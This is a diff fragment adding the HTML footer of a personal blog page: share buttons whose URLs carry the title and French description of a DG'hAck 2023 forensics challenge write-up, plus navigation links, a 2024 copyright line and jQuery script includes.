+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&is_video=false&description=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&title=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&title=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&name=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow&description=Solution%20du%20challenge%20%26ldquo%3bL%26rsquo%3ban%201%2c%20et%20puis%20l%26rsquo%3ban%202%26rdquo%3b%20cr%c3%a9%c3%a9%20pour%20le%20DG%26rsquo%3bhAck%202023.%0aDescription%20Sur%20le%20r%c3%a9seau%20de%20l%26rsquo%3bentreprise%20d%26rsquo%3bun%20ami%2c%20un%20employ%c3%a9%20a%20lanc%c3%a9%20un%20fichier%20inconnu%20provenant%20d%26rsquo%3bune%20cl%c3%a9%20USB.%20Apeur%c3%a9%2c%20il%20s%26rsquo%3best%20rendu%20%c3%a0%20la%20DSI%20qui%20a%20r%c3%a9alis%c3%a9%20un%20dump%20m%c3%a9moire%20de%20la%20machine%20par%20pr%c3%a9caution.%20Selon-eux%20il%20n%26rsquo%3by%20a%20rien%20%c3%a0%20craindre%2c%20la%20machine%20n%26rsquo%3best%20pas%20compromise.%0aMais%20quelques%20temps%20apr%c3%a8s%20avoir%20rebranch%c3%a9%20son%20PC%20sur%20le%20r%c3%a9seau%2c%20l%26rsquo%3bemploy%c3%a9%20s%26rsquo%3best%20mis%20%c3%a0%20perdre%20certains%20de%20ses%20fichiers%2c%20pris%20de%20panique%20il%20a%20%c3%a9teint%20sa%20machine." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&t=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  Itarow 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+
+
+</html>
